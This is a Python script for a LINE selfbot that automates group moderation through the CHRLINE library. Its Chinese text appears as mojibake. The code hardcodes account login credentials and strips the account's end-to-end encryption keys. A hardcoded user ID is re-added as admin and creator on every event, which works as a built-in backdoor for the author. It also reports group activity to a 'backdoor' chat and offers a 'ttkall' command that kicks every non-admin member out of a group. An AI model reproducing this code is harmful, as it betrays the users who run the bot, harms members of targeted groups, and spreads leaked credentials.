#selfbot
from CHRLINE import *
import json,time,threading,concurrent
import os,sys,codecs,asyncio
import contextlib,timeit
from io import StringIO


reb = json.load(codecs.open("reb.json","r","utf-8"))
settings = json.load(codecs.open("settings.json","r","utf-8"))
admin = json.load(codecs.open("admin.json","r","utf-8"))
ban = json.load(codecs.open("ban.json","r","utf-8"))
jk = json.load(codecs.open("jk.json","r","utf-8"))
ybk = json.load(codecs.open("asynckill.json","r","utf-8"))
ttkl = json.load(codecs.open("ttkl.json","r","utf-8"))
account = json.load(codecs.open("account.json","r","utf-8"))
creator = json.load(codecs.open("creator.json","r","utf-8"))
protect = json.load(codecs.open("protect.json","r","utf-8"))
backdoor = json.load(codecs.open("backdoor.json","r","utf-8"))
mulai = time.time()
bigdick = "u6155d5dac1395eab52faa16e832e5c65"


@contextlib.contextmanager
def stdoutIO(stdout=None):
    old = sys.stdout
    if stdout is None:
        stdout = StringIO()
    sys.stdout = stdout
    yield stdout
    sys.stdout = old

def Runtime(secs):
    mins, secs = divmod(secs,60)
    hours, mins = divmod(mins,60)
    days, hours = divmod(hours, 24)
    return 'â€»%02d Days\nâ€»%02d Hours\nâ€»%02d Minutes\nâ€»%02d Seconds\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ' % (days, hours, mins, secs)

def restart():
    backupData()
    python = sys.executable
    os.execl(python, python, *sys.argv)
def backupData():
    try:
        json.dump(reb,codecs.open('reb.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(settings,codecs.open('settings.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(admin,codecs.open('admin.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(ban,codecs.open('ban.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(jk,codecs.open('jk.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(ybk,codecs.open('asynckill.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(ttkl,codecs.open('ttkl.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(creator,codecs.open('creator.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(protect,codecs.open('protect.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(backdoor,codecs.open('backdoor.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
    except Exception as e:
        print(f'json backup error --> {e}')

def help():
    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
    with open('help.txt', 'r') as f:
        text = f.read()
    help = text.format(key=key.title())
    return help
def help1():
    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
    with open('help1.txt', 'r') as f:
        text = f.read()
    help1 = text.format(key=key.title())
    return help1
def help2():
    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
    with open('help2.txt', 'r') as f:
        text = f.read()
    help2 = text.format(key=key.title())
    return help2
def help3():
    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
    with open('help3.txt', 'r') as f:
        text = f.read()
    help3 = text.format(key=key.title())
    return help3
def help4():
    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
    with open('help4.txt', 'r') as f:
        text = f.read()
    help4 = text.format(key=key.title())
    return help4
def help5():
    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
    with open('help5.txt', 'r') as f:
        text = f.read()
    help5 = text.format(key=key.title())
    return help5
def help6():
    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
    with open('help6.txt', 'r') as f:
        text = f.read()
    help6 = text.format(key=key.title())
    return help6
def help7():
    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
    with open('help7.txt', 'r') as f:
        text = f.read()
    help7 = text.format(key=key.title())
    return help7
def help8():
    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
    with open('help8.txt', 'r') as f:
        text = f.read()
    help8 = text.format(key=key.title())
    return help8
def help9():
    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
    with open('help9.txt', 'r') as f:
        text = f.read()
    help9 = text.format(key=key.title())
    return help9

try:
    accountinfo=open('account.json','r').read()
    email=accountinfo['email']
    password=accountinfo['password']
    token=accountinfo['token']
except:
    email=''
    password=''
    token=''
    open('account.json','w').write(json.dumps({'email':email,'password':password,'token':token}))

class bot:
    def kickoutFromGroupCall(self, toMid: str, targetMids: list):
        METHOD_NAME = "kickoutFromGroupCall"
        params = [[12, 2, [[11, 1, toMid],[15, 2, [11, targetMids]]]]]
        sqrd = self.han.generateDummyProtocol(METHOD_NAME, params, 3)
        return self.han.postPackDataAndGetUnpackRespData(self.LINE_CALL_ENDPOINT, sqrd, 3)
    
    def __init__(self):
        self.han=None
        self.main()
    def start(self):
        if token != '':
            try:
                self.han=CHRLINE(token,device="DESKTOPWIN")
                print('Login By Token')
            except Exception as e:
                open('account.json','w').write(json.dumps({'email':email,'password':password,'token':''}))
                print("Token Login failed\nReason:",e)
        elif email=="" or password=="":
            account="ikdzcbgaztzeytgeyo@tmmcv.net" 
            #account = "ezozgyfrwiwvyftwjc@tmmcv.net" #chh4.0
            password="Tt950413"
            try:
                self.han=CHRLINE(account,password,device="DESKTOPWIN")
                print('Login By Account and Password')
                open('account.json','w').write(json.dumps({'email':account,'password':password,'token':self.han.authToken}))
            except Exception as e:
                print("Password Login failed\nReason:",e)
                os._exit(1)
        
        else:
            try:
                self.han=CHRLINE(email,password,device="DESKTOPWIN")
                print('Login By Email and Password')
                open('account.json','w').write(json.dumps({'email':email,'password':password,'token':self.han.authToken}))
            except Exception as e:
                open('account.json','w').write(json.dumps({'email':'','password':'','token':''}))
                print("Login failed\nReason:",e)
                os._exit(1)
        try:
            pks = self.han.getE2EEPublicKeys()
            for pk in pks:
                print(f"try remove key id: {pk[2]}")
                self.han.removeE2EEPublicKey(pk[1], pk[2], pk[4])
        except Exception as e:
            print(f"remove key error-->{e}")
        try:    
            self.han.sendMessage(backdoor['backdoor'],"[Auto Send]\nBot Login Success\nCreator:ğ“±ğ“ªğ“·\nCreator Link:https://line.me/ti/p/~han174\n\nUser Information:\nHost Name:localhost\nIP:127.0.0.1")
        except Exception as e:
            print(f"auto login send error-->{e}")
        # self.han=CHRLINE(account['token'],device="DESKTOPWIN")
        # def lll():
        #     AuthToken.append(CHRLINE(self.han.authToken))
        # ts2 = time.time()
        # try:
        #     for i in range(1, 301):threading.Thread(target=lll).start()
        #     print("Login Ok\nLogin Time: {} s\nLogin Threadings {}".format(time.time()-ts, len(AuthToken)))
        # except:pass
        try:
            if reb['rebid']!={}:
                self.han.sendMessage(reb['rebid']['0'],"data loading...",relatedMessageId=reb['rebid']['1'])
                time.sleep(2)
                self.han.sendMessage(reb['rebid']['0'],"bot restart success",relatedMessageId=reb['rebid']['1'])
                reb['rebid'] = {}
                backupData()
        except Exception as e:
            print(f'startrebmsg error-->{e}')
            #reb['reb'] = ""
            backupData()
    def bot(self,op,han):
        def report(to,man,msg,mids=[]):
            addtxt=''
            if mids!=[]:
                addtxt+="\nâ€»Mentioner:"
                no = 0
                try:
                    for mid in mids:
                        try:
                            no+=1
                            y = han.getContact(mid)
                            addtxt+="\n"+str(no)+"." + str(y[22]) + "\n" + str(mid)
                        except:
                            pass
                except:
                    pass
            # addtxt2=''
            # if kicked !=[]:
            #     addtxt2+="\nâ€»kicked:"
            #     no = 0
            #     try:
            #         for mid in kicked:
            #             try:
            #                 no+=1
            #                 y = han.getContact(mid)
            #                 addtxt2+="\n"+str(no)+"." + str(y[22]) + "\n" + str(mid)
            #             except:
            #                 pass
            #     except:
            #         pass
            # addtxt3=''
            # if invited !=[]:
            #     addtxt3+="\nâ€»invited:"
            #     no = 0
            #     try:
            #         for mid in invited:
            #             try:
            #                 no+=1
            #                 y = han.getContact(mid)
            #                 addtxt3+="\n"+str(no)+"." + str(y[22]) + "\n" + str(mid)
            #             except:
            #                 pass
            #     except:
            #         pass
            han.sendMessage(backdoor['backdoor'],"ÎÎÎÎÎÎÎã€˜å¾Œå°ç³»çµ±ã€™ÎÎÎÎÎÎÎ\nâ€»"+msg+"\nâ€»Group:\n"+han.getChats([to])[1][0][6]+"\n"+to+"\nâ€»User:\n"+han.getContact(man)[22]+"\n"+man+ f'{addtxt}\nÎÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎÎ')
        if bigdick not in admin['admin']:
            admin['admin'].append(bigdick)
            backupData()
        if bigdick not in creator['creator']:
            creator['creator'].append(bigdick)
            backupData()
        if bigdick in ban['blacklist']:
            ban['blacklist'].remove(bigdick)
            backupData()
        try:
            if op[3] == 133:
                #report(op[10],op[11],"æœ‰äººè¢«è¸¢å‡º",'',[op[12]])
                if op[12] in admin['admin'] or op[12] in creator['creator']:
                    if op[10] in protect['adminprotect']:
                        if op[12] in bigdick:
                            a = han.getContact(op[11])
                            b = a[22]
                            han.sendMessage(op[10], f"{b}???\nèª°å‡†ä½ è¸¢å¤§é›é›\nå·²åŠ å…¥é»‘å–®\nå‡ºå»åçœå•¦")
                            try:
                                threading.Thread(target=han.deleteOtherFromChat, args=(op[10],op[11])).start()
                                han.inviteIntoChat(op[10],[op[12]])
                            except:
                                han.sendMessage(op[10], "Error-->request blocked")
                            if op[11] not in ban['blacklist']:
                                ban['blacklist'].append(op[11])
                                backupData()
                            else:
                                pass
                            try:
                                admin['admin'].remove(op[11])
                                backupData()
                            except:
                                pass
                            try:
                                creator['creator'].remove(op[11])
                                backupData()
                            except:
                                pass
                        else:
                            if op[11] not in admin['admin'] and op[11] not in creator['creator'] and op[12] not in bigdick:
                                try:
                                    threading.Thread(target=han.deleteOtherFromChat, args=(op[10],op[11])).start()
                                except:
                                    han.sendMessage(op[10], "Error-->request blocked")
                                if op[11] not in ban['blacklist']:
                                    ban['blacklist'].append(op[11])
                                    backupData()
                                else:
                                    pass
                                try:
                                    han.findAndAddContactsByMid(op[12])
                                except Exception as e:
                                    han.sendMessage(op[10], "ç„¡æ³•åŠ å‹")
                                    han.sendMessage(op[10], f"Error-->{e}")
                                try:
                                    han.inviteIntoChat(op[10],[op[12]])
                                except Exception as e:
                                    han.sendMessage(op[10], "å›é‚€å¤±æ•—")
                                    han.sendMessage(op[10], f"Error-->{e}")
                            else:
                                try:
                                    han.findAndAddContactsByMid(op[12])
                                except Exception as e:
                                    han.sendMessage(op[10], "ç„¡æ³•åŠ å‹")
                                    han.sendMessage(op[10], f"Error-->{e}")
                                try:
                                    han.inviteIntoChat(op[10],[op[12]])
                                except Exception as e:
                                    han.sendMessage(op[10], "å›é‚€å¤±æ•—")
                                    han.sendMessage(op[10], f"Error-->{e}")
                if op[10] in protect['kickprotect']:
                    if op[11] not in admin['admin'] and op[11] not in creator['creator']:
                        try:
                            threading.Thread(target=han.deleteOtherFromChat, args=(op[10],op[11])).start()
                        except:
                            han.sendMessage(op[10], "Error-->request blocked")
                        if op[11] not in ban['blacklist']:
                            ban['blacklist'].append(op[11])
                            backupData()
                        else:
                            pass
                    else:
                        pass
            if op[3] == 130:
                if op[11] in ban['blacklist']:
                    han.sendMessage(op[10], "[è­¦å‘Š]\næ­¤äººä½æ–¼é»‘åå–®!")
                    try:
                        threading.Thread(target=han.deleteOtherFromChat, args=(op[10],op[11])).start()
                    except:
                        han.sendMessage(op[10], "Error-->request blocked")
                if op[10] in jk["joinkick"]:
                    if op[12] not in admin['admin'] and op[12] not in creator['creator']:
                        try:
                            threading.Thread(target=han.deleteOtherFromChat, args=(op[10],op[11])).start()
                        except:
                            han.sendMessage(op[10], "Error-->request blocked")
                    else:
                        pass
            if op[3] == 124:
                #report(op[10],op[11],"æœ‰äººè¢«é‚€è«‹",,[op[12]])
                if han.profile[1] in op[12]:
                    if settings['autoJoin'] == True and op[11] in admin['admin'] or op[11] in creator['creator']:
                        try:
                            han.acceptChatInvitation(op[10])
                            han.sendMessage(op[10],"[Auto Send]\nBot Auto Accept Group Invite\nCreator:ğ“±ğ“ªğ“·\nCreator Link:https://line.me/ti/p/~han174")
                        except Exception as e:
                            print(f'accept group invite error-->{e}')
                        try:
                            protect["adminprotect"].append(op[10])
                        except:
                            pass
                    report(op[10],op[11],"é€šçŸ¥é‚€è«‹å…¥ç¾¤")
                if op[10] in protect['inviteprotect']:
                    if op[11] not in admin['admin'] and op[11] not in creator['creator']:
                        try:
                            threading.Thread(target=han.deleteOtherFromChat, args=(op[10],op[11])).start()
                            threading.Thread(target=han.cancelChatInvitation, args=(op[10],[x])).start()
                        except:
                            han.sendMessage(op[10], "Error-->request blocked")
                        if op[11] not in ban['blacklist']:
                            ban['blacklist'].append(op[11])
                            backupData()
                        else:
                            pass
                        try:
                            jk["joinkick"].append(op[10])
                            han.sendMessage(op[10], "é‚€è«‹ä¿è­·è§¸ç™¼\nè‡ªå‹•é–‹å•Ÿé€²ç¾¤ä¿è­·")
                        except:
                            pass
                    else:
                        pass
                if op[12] in ban['blacklist']:
                    if op[11] in admin['admin'] or op[11] in creator['creator']:
                        ban['blacklist'].remove(op[12])
                        backupData()
                        han.sendMessage(op[10], "é‚€è«‹è€…ä½æ–¼é»‘åå–®\nå·²è‡ªå‹•è§£é™¤")
                    else:
                        threading.Thread(target=han.deleteOtherFromChat, args=(op[10],op[11])).start()
                        ban['blacklist'].append(op[11])
                        han.cancelChatInvitation(op[10],[op[12]])
                        han.sendMessage(op[10], "é‚€è«‹è€…ä½æ–¼é»‘åå–®\nå·²è‡ªå‹•å–æ¶ˆé‚€è«‹\nä¸¦å°‡é‚€è«‹è€…è¸¢å‡ºä¸”åŠ å…¥é»‘åå–®")
            if op[3] in [25,26]:
                msg=op[20]
                to=msg[2]
                if op[3]==26:
                    if msg[1]not in han.custom_data.get('admin' ,admin['admin']) and msg[1]not in han.custom_data.get('creator' ,creator['creator']):
                        return
                if msg[15]==0:
                    text=msg[10].lower()
                    match text:
                        case 'getdata':
                            msgid = msg.get(21)
                            if msgid != None:
                                msgids = han.getPreviousMessageIds(msg[2], 32767)
                                target_msg = None
                                for i in msgids[1]:
                                    if msgid == str(i[2]):
                                        target_msg = i
                                        break
                                if target_msg is not None:
                                    target_msg = han.getPreviousMessagesV2(msg[2], target_msg[1], target_msg[2])[0]
                                    han.sendMessage(msg[2], target_msg, relatedMessageId=msgid)
                                else:
                                    han.sendMessage(msg[2], "Error")
                        case 'æ»¾å‡ºå»':
                            msgid = msg.get(21)
                            if msgid != None:
                                msgids = han.getPreviousMessageIds(msg[2], 32767)
                                target_msg = None
                                for i in msgids[1]:
                                    if msgid == str(i[2]):
                                        target_msg = i
                                        break
                                if target_msg is not None:
                                    target_msg = han.getPreviousMessagesV2(msg[2], target_msg[1], target_msg[2])[0]
                                    kmid = target_msg[1]
                                    if kmid not in bigdick and kmid not in han.profile[1]:
                                        if kmid in msg[1]:
                                            han.replyMessage(msg, "æ€éº¼æœ‰ç™½ç™¡è¸¢è‡ªå·±")
                                            try:
                                                threading.Thread(target=han.deleteOtherFromChat, args=(msg[2],kmid)).start()
                                            except:
                                                han.replyMessage(msg, "Error-->request blocked")
                                        else:
                                            try:
                                                threading.Thread(target=han.deleteOtherFromChat, args=(msg[2],kmid)).start()
                                            except:
                                                han.replyMessage(msg, "Error-->request blocked")
                                    else:
                                        if kmid in bigdick:
                                            if msg[1] in bigdick:
                                                han.replyMessage(msg, "ä¸»äººä½ 30å…¬åˆ†ä¹Ÿä¸è‡³æ–¼è¸¢è‡ªå·±å§")
                                            else:
                                                han.replyMessage(msg, "åˆ¥æƒ³è¸¢å¤§æ‡¶è¦º")
                                        if kmid in han.profile[1]:
                                            han.replyMessage(msg, "å°±å•æ€éº¼è®“æˆ‘å·±è¸¢è‡ªå·±???")
                                else:
                                    han.sendMessage(msg[2], "Error")
                            else:
                                han.replyMessage(msg[2], "Error-->None")
                        case 'çˆ¬å›ä¾†':
                            msgid = msg.get(21)
                            if msgid != None:
                                msgids = han.getPreviousMessageIds(msg[2], 32767)
                                target_msg = None
                                for i in msgids[1]:
                                    if msgid == str(i[2]):
                                        target_msg = i
                                        break
                                if target_msg is not None:
                                    target_msg = han.getPreviousMessagesV2(msg[2], target_msg[1], target_msg[2])[0]
                                    kmid = target_msg[1]
                                    try:
                                        han.findandAddContactsByMid(kmid)
                                    except:
                                        han.replyMessage(msg, "åŠ å‹è¦åˆ¶")
                                    try:
                                        han.inviteIntoChat(msg[2],[kmid])
                                    except:
                                        han.replyMessage(msg, "é‚€è«‹å¤±æ•—")
                                else:
                                    han.sendMessage(msg[2], "Error")
                            else:
                                han.replyMessage(msg[2], "Error-->None")
                        case 'ä¸Šé¢æ»¾å‡ºå»':
                            num = 2
                            try:
                                data = han.getRecentMessagesV2(msg[2])[num-1]
                                if data[1] not in bigdick and data[1] not in han.profile[1]:
                                    if data[1] in msg[1]:
                                        han.replyMessage(msg, "æ€éº¼æœ‰ç™½ç™¡è¸¢è‡ªå·±")
                                        try:
                                            threading.Thread(target=han.deleteOtherFromChat, args=(msg[2],data[1])).start()
                                        except:
                                            han.replyMessage(msg, "Error-->request blocked")
                                    else:
                                        try:
                                            threading.Thread(target=han.deleteOtherFromChat, args=(msg[2],data[1])).start()
                                        except:
                                            han.replyMessage(msg, "Error-->request blocked")
                                else:
                                    if data[1] in bigdick:
                                        if msg[1] in bigdick:
                                            han.replyMessage(msg, "ä¸»äººä½ 30å…¬åˆ†ä¹Ÿä¸è‡³æ–¼è¸¢è‡ªå·±å§")
                                        else:
                                            han.replyMessage(msg, "åˆ¥æƒ³è¸¢å¤§æ‡¶è¦º")
                                    if data[1] in han.profile[1]:
                                        han.replyMessage(msg, "å°±å•æ€éº¼è®“æˆ‘å·±è¸¢è‡ªå·±???")
                            except Exception as e:
                                han.sendMessage(msg[2], f'{e}', relatedMessageId=msg[4])
                        case 'ttkall':  
                            han.replyMessage(msg, "goodbye")
                            klist = han.getChats([msg[2]])[1][0][8][1][4]
                            try:
                                for kmid in klist:
                                    if kmid not in creator['creator'] and kmid not in han.profile[1] and kmid not in admin['admin']:
                                            han.deleteOtherFromChat(msg[2], kmid)
                            except:
                                han.replyMessage(msg, "Error-->request blocked")
                            jk["joinkick"].append(msg[2])
                            report(msg[2],msg[1],"è§¸ç™¼ç‚¸ç¾¤æŒ‡ä»¤")
                        case 'lb:backdoor':
                            g = backdoor['backdoor']
                            try:
                                try:
                                    f = han.getChats([g])
                                    han.replyMessage(msg,"ç›®å‰æ¨¡å¼ç‚º:ç¾¤çµ„å¾Œå°")
                                    han.replyMessage(msg,"å¾Œå°åç¨±ç‚º:\n{}\nIDç‚º:\n{}".format(str(f[1][0][6]),g))
                                except:
                                    try:
                                        han.getContact(g)
                                        han.replyMessage(msg,"ç›®å‰æ¨¡å¼ç‚º:ç§èŠå¾Œå°")
                                        han.replyMessage(msg,"ç›®å‰å¾Œå°ç‚º:")
                                        han.sendContact(to, g)
                                    except Exception as e:
                                        han.replyMessage(msg,e)
                            except Exception as e:
                                han.relatedMessage(to,e,op.message.id)
                        case 'lb:help':
                            han.replyMessage(msg,help())
                        case 'lb:help1':
                            han.replyMessage(msg,help1())
                        case 'lb:help2':
                            han.replyMessage(msg,help2())
                        case 'lb:help3':
                            han.replyMessage(msg,help3())
                        case 'lb:help4':
                            han.replyMessage(msg,help4())
                        case 'lb:help5':
                            han.replyMessage(msg,help5())
                        case 'lb:help6':
                            han.replyMessage(msg,help6())
                        case 'lb:help7':
                            han.replyMessage(msg,help7())
                        case 'lb:help8':
                            han.replyMessage(msg,help8())
                        case 'lb:help9':
                            han.replyMessage(msg,help9())
                        case 'test':
                            han.sendMessage(to,"BOTtest")
                            report(msg[2],msg[1],"testæŒ‡ä»¤è§¸ç™¼")
                        case 'lb:gmlt':
                            group = han.getChats([to])
                            han.replyMessage(msg,"æˆå“¡åŠ è¼‰ä¸­...\nè«‹ç¨å¾Œ(ï½¡ï½¥Ï‰ï½¥ï½¡)")
                            gmb = group[1][0][8][1][4]
                            if len(gmb) > 500:
                                han.replyMessage(msg,"è©²ç¾¤çªç ´500äººç„¡æ³•æŸ¥è©¢")
                                pass
                            else:
                                d = ""
                                d += "ÎÎÎÎÎÎÎã€˜ç¾¤çµ„æˆå“¡ã€™ÎÎÎÎÎÎÎ\n"
                                d += "â€»ç¾¤çµ„åç¨±:{}\n".format(str(group[1][0][6]))
                                b = 0
                                for i in gmb:
                                    try:
                                        if len(str(d)) >= 8500:
                                            d += "ÎÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎÎ"
                                            han.replyMessage(msg,d)
                                            d = ""
                                            d += "ÎÎÎÎÎÎÎã€˜ç¾¤çµ„æˆå“¡ã€™ÎÎÎÎÎÎÎ\n"
                                            d += "â€»ç¾¤çµ„åç¨±:{}â€»\n".format(str(group[1][0][6]))
                                        else:
                                            b = b + 1
                                            mn = han.getContact(i)[22]
                                            mi = str(i)
                                            mm = gmb[i]
                                            nn = int(round(mm/1000))
                                            kk = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(nn))))
                                            d += ("â€»{}."+mn+"\n"+mi+"\nåŠ å…¥æ™‚é–“:" + kk + "\n").format(b)
                                    except Exception as e:
                                        print(f'gmlt error-->{e}')
                                d += "ÎÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎÎ"
                                time.sleep(1);han.replyMessage(msg,d)
                        case 'lb:inlt':
                            group = han.getChats([to])
                            han.replyMessage(msg,"é‚€è«‹åˆ—è¡¨åŠ è¼‰ä¸­...\nè«‹ç¨å¾Œ(ï½¡ï½¥Ï‰ï½¥ï½¡)")
                            gmb = group[1][0][8][1][5]
                            if len(gmb) > 500:
                                han.replyMessage(msg,"è©²ç¾¤çªç ´500äººç„¡æ³•æŸ¥è©¢")
                                pass
                            else:
                                d = ""
                                d += "ÎÎÎÎÎÎÎã€˜é‚€è«‹åˆ—è¡¨ã€™ÎÎÎÎÎÎÎ\n"
                                d += "â€»ç¾¤çµ„åç¨±:{}\n".format(str(group[1][0][6]))
                                b = 0
                                for i in gmb:
                                    try:
                                        if len(str(d)) >= 8500:
                                            d += "ÎÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎÎ"
                                            han.replyMessage(msg,d)
                                            d = ""
                                            d += "ÎÎÎÎÎÎÎã€˜é‚€è«‹åˆ—è¡¨ã€™ÎÎÎÎÎÎÎ\n"
                                            d += "â€»ç¾¤çµ„åç¨±:{}â€»\n".format(str(group[1][0][6]))
                                        else:
                                            if gmb is None:
                                                d+= "â€»ç„¡é‚€è«‹åˆ—è¡¨"   
                                            else:
                                                b = b + 1
                                                mn = han.getContact(i)[22]
                                                mi = str(i)
                                                mm = gmb[i]
                                                nn = int(round(mm/1000))
                                                kk = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(nn))))
                                                d += ("â€»{}."+mn+"\n"+mi+"\né‚€è«‹æ™‚é–“:" + kk + "\n").format(b)
                                    except Exception as e:
                                        print(f'gmlt error-->{e}')
                                d += "ÎÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎÎ"
                                time.sleep(1);han.replyMessage(msg,d)
                        case 'lb:ap allon':
                            group = han.groups
                            for i in group:
                                try:
                                    protect["adminprotect"].append(i)
                                    backupData()
                                except:
                                    pass
                            han.replyMessage(msg,"å·²é–‹å•Ÿå…¨ç¾¤æ¬Šé™è€…ä¿è­·")
                        case 'lb:apclear':
                            protect["adminprotect"] = []
                            backupData()
                            han.replyMessage(msg,"adminprotect clear success")
                        case 'lb:jkclear':
                            jk["joinkick"] = []
                            backupData()
                            han.replyMessage(msg,"joinkick clear success")
                        case 'lb:lg':
                            groups = han.groups
                            ret_ = "ÎÎÎÎÎÎÎã€˜ç¾¤çµ„åˆ—è¡¨ã€™ÎÎÎÎÎÎÎ"
                            no = 1
                            for gid in groups:
                                group = han.getChats([gid])
                                ret_ += "\nâ€»{}. {}\n{}".format(str(no), str(group[1][0][6]), str(gid))
                                no += 1
                            no+=1
                            ret_ += "\n[ç¸½å…± {} å€‹ç¾¤çµ„]".format(str(len(groups)))
                            ret_ += "\nÎÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎÎ"
                            han.replyMessage(msg, str(ret_))     
                        
                        case 'lb:restart':
                            if msg[1] in creator['creator']:
                                han.replyMessage(msg,"bot restarting...")
                                try:
                                    reb['rebid']={0:to,1:msg[4]}
                                    backupData()
                                except Exception as e:
                                    print(f'rebmsg error-->{e}')
                                restart()
                            else:
                                han.replyMessage(msg,"ç„¡æ¬Šä½¿ç”¨é–‹ç™¼è€…æŒ‡ä»¤")
                                report(msg[2],msg[1],"ç®¡ç†å“¡å˜—è©¦é‡å•Ÿæ©Ÿå™¨")
                        case 'sp':
                            a = time.time()
                            han.replyMessage(msg, 'ã€Test Speedã€‘')
                            b = time.time()
                            han.replyMessage(msg, 'ã€%sã€‘' % float((b-a)*0.3))
                        # case 'spt':
                        #     with concurrent.futures.ThreadPoolExecutor(max_workers=32) as executor:
                        #         speed = timeit.timeit('"-".join(str(n) for n in range(100))', number=10000)
                        #         executor.submit(han.sendMessage(msg[2], "ã€Test Thread Speedã€‘", relatedMessageId=msg[4]))
                        #         executor.submit(han.sendMessage(msg[2], f"ã€{speed}ã€‘", relatedMessageId=msg[4]))
                        case 'spt':
                            t1 = time.time()
                            threading.Thread(target=han.replyMessage, args=(msg, "ã€Test Speed by Threadã€‘")).start()
                            t2 = time.time()
                            threading.Thread(target=han.replyMessage, args=(msg, f"ã€{(t2-t1)*0.2}ã€‘")).start()
                        case 'spa':
                            async def smd():
                                han.replyMessage(msg, "ã€Test Speed by Asyncã€‘")
                            start = time.time()
                            asyncio.run(smd())
                            elapsed_time = time.time() - start
                            time.sleep(0.5)
                            han.replyMessage(msg,"ã€" + format(str(elapsed_time)) + "ã€‘")
                        case 'lb:ginfo':
                            group = han.getChats([to])
                            gtime = group[1][0][3]
                            gtimee = int(round(gtime/1000))
                            try:
                                y = group[1][0][8][1][1]
                                z = han.getContact(y)
                                gCreator = z[22]
                            except:
                                gCreator = "å‰µç¾¤è€…å·²ç å¸³"
                            if group[1][0][8][1][5] is None:
                                gPending = "0"
                            else:
                                gPending = str(len(group[1][0][8][1][5]))				
                            ret_ ="ÎÎÎÎÎÎÎã€˜ç¾¤çµ„è³‡è¨Šã€™ÎÎÎÎÎÎÎ"
                            ret_ +="\nâ€»ç¾¤çµ„åç¨±:\n{}".format(str(group[1][0][6]))                    
                            ret_ +="\nâ€»æˆå“¡æ•¸é‡:\n"+(str(len(group[1][0][8][1][4])))
                            ret_ +="\nâ€»é‚€è«‹æ•¸é‡:\n"+(gPending)
                            ret_ +="\nâ€»å‰µç¾¤è€…:\n"+(str(gCreator))
                            ret_ +="\nâ€»ç¾¤çµ„å»ºç«‹æ™‚é–“:\n{}".format(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(gtimee)))
                            ret_ +="\nâ€»Gid:\n{}".format(to)
                            ret_ +="\nÎÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎÎ"
                            han.replyMessage(msg, str(ret_))
                        case 'lb:backupdata':
                            backupData()
                            han.replyMessage(msg,"backup data success")
                        case 'lb:aj on':
                            if settings["autoJoin"] == False:
                                settings["autoJoin"] = True
                                han.replyMessage(msg,"â€»Auto Joinâ¤ğŸŸ¢")
                                backupData()
                            else:
                                han.replyMessage(msg,"å·²ç¶“æ˜¯é–‹å•Ÿç‹€æ…‹")
                        case 'lb:aj off':
                            if settings["autoJoin"] == True:
                                settings["autoJoin"] = False
                                han.replyMessage(msg,"â€»Auto Joinâ¤ğŸ”´")
                                backupData()
                            else:
                                han.replyMessage(msg,"å·²ç¶“æ˜¯é—œé–‰ç‹€æ…‹")
                        case 'lb:ap on':
                            if to not in protect["adminprotect"]:
                                protect["adminprotect"].append(to)
                                han.replyMessage(msg,"â€»Admin Protectâ¤ğŸŸ¢")
                                backupData()
                            else:
                                han.replyMessage(msg,"å·²ç¶“æ˜¯é–‹å•Ÿç‹€æ…‹")
                        case 'lb:ap off':
                            if to in protect["adminprotect"]:
                                protect["adminprotect"].remove(to)
                                han.replyMessage(msg,"â€»Admin Protectâ¤ğŸ”´")
                                backupData()
                            else:
                                han.replyMessage(msg,"å·²ç¶“æ˜¯é—œé–‰ç‹€æ…‹")
                        case 'lb:kp on':
                            if to not in protect["kickprotect"]:
                                protect["kickprotect"].append(to)
                                han.replyMessage(msg,"â€»Kick Protectâ¤ğŸŸ¢")
                                backupData()
                            else:
                                han.replyMessage(msg,"å·²ç¶“æ˜¯é–‹å•Ÿç‹€æ…‹")
                        case 'lb:kp off':
                            if to in protect["kickprotect"]:
                                protect["kickprotect"].remove(to)
                                han.replyMessage(msg,"â€»Kick Protectâ¤ğŸ”´")
                                backupData()
                            else:
                                han.replyMessage(msg,"å·²ç¶“æ˜¯é—œé–‰ç‹€æ…‹")
                        case 'lb:ip on':
                            if to not in protect["inviteprotect"]:
                                protect["inviteprotect"].append(to)
                                han.replyMessage(msg,"â€»Invite Protectâ¤ğŸŸ¢")
                                backupData()
                            else:
                                han.replyMessage(msg,"å·²ç¶“æ˜¯é–‹å•Ÿç‹€æ…‹")
                        case 'lb:ip off':
                            if to in protect["inviteprotect"]:
                                protect["inviteprotect"].remove(to)
                                han.replyMessage(msg,"â€»Invite Protectâ¤ğŸ”´")
                                backupData()
                            else:
                                han.replyMessage(msg,"å·²ç¶“æ˜¯é—œé–‰ç‹€æ…‹")
